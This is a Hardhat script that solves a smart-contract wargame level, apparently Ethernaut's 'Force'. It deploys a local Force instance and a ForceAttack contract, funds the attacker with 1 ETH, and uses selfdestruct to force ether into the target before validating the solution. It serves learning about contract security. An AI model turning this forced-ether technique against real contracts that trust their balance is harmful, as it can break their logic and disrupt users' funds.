const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    console.log("\n[0] original owner: ", owner.address);
    console.log("[0] player: ", player.address);

    console.log("\n[1] deploy ForceFactory");
    const Factory = await ethers.getContractFactory("ForceFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();
    console.log("---- ForceFactory address: ", factory.address);

    console.log("\n[2] create a Force instance");
    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const force = await ethers.getContractAt("Force", instance_address, owner);
    console.log("---- Force address: ", force.address);

    console.log("\n[3] deploy ForceAttack");
    const Attack = await ethers.getContractFactory("ForceAttack");
    const attack = await Attack.connect(player).deploy();

    console.log("\n[4] send 1ETH to ForceAttack");
    const tx = {
        to: attack.address,
        value: ethers.utils.parseEther("1"),
        gasLimit: 50000,
    };
    await player.sendTransaction(tx);
    console.log("---- sending tx:", tx);

    console.log("\n[5] attack");
    console.log("---- selfdestruct(force.address)");
    await attack.attack(force.address);

    console.log("\n[6] validate solved");

    const res = await factory.validateInstance(force.address, player.address);
    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});

